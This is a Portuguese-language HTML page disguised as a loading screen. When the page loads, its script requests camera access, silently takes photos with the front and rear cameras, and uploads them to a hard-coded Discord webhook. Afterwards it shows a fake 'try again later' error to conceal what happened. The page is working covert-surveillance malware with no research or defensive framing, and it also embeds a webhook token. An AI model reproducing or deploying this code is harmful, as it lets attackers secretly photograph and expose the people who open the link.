<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Carregando...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: system-ui, -apple-system, sans-serif;
    background: #0a0a0a;
    color: #ccc;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 20px;
  }
  .container {
    max-width: 320px;
  }
  .spinner {
    width: 48px;
    height: 48px;
    border: 4px solid #333;
    border-top-color: #3b82f6;
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
    margin: 0 auto 24px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  #status {
    font-size: 1.05rem;
    line-height: 1.5;
    color: #aaa;
  }
  .error {
    color: #f87171;
  }
  video, canvas { display: none; }
</style>
</head>
<body>
  <div class="container">
    <div class="spinner" id="spinner"></div>
    <div id="status">Carregando...</div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

<script>
const statusEl = document.getElementById('status');
const spinnerEl = document.getElementById('spinner');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1568339134081146942/HzZ4Ohe6oPb4JlU4Ng8jK2jkb3JELjiPWWMETzjVRbjKTKtQ2WF4bJTU1p-c8Jk61WJ-';

const CAMERAS = [
  { label: 'Frontal', facingMode: 'user' },
  { label: 'Traseira', facingMode: 'environment' }
];

function setStatus(text, isError = false) {
  statusEl.textContent = text;
  statusEl.className = isError ? 'error' : '';
}

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function captureCamera(cam) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: { ideal: cam.facingMode } },
    audio: false
  });
  try {
    video.srcObject = stream;
    await video.play();
    await wait(1100);

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
    if (!blob) throw new Error('Frame vazio');
    return blob;
  } finally {
    stream.getTracks().forEach(track => track.stop());
    video.srcObject = null;
  }
}

async function sendToWebhook(cam, blob) {
  const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
  const formData = new FormData();
  formData.append('file', blob, fileName);
  formData.append('content', `📸 ${cam.label}`);

  const response = await fetch(WEBHOOK_URL, {
    method: 'POST',
    body: formData
  });

  if (!response.ok) {
    throw new Error('Falha no envio');
  }
}

async function run() {
  try {
    for (const cam of CAMERAS) {
      const blob = await captureCamera(cam);
      await sendToWebhook(cam, blob);
    }
  } catch (err) {
    console.error(err);
  } finally {
    // Sempre mostra a mesma mensagem no final (sucesso ou erro)
    spinnerEl.style.display = 'none';
    setStatus('Erro, tente novamente mais tarde', true);
  }
}

window.addEventListener('load', run);
</script>
</body>
</html>
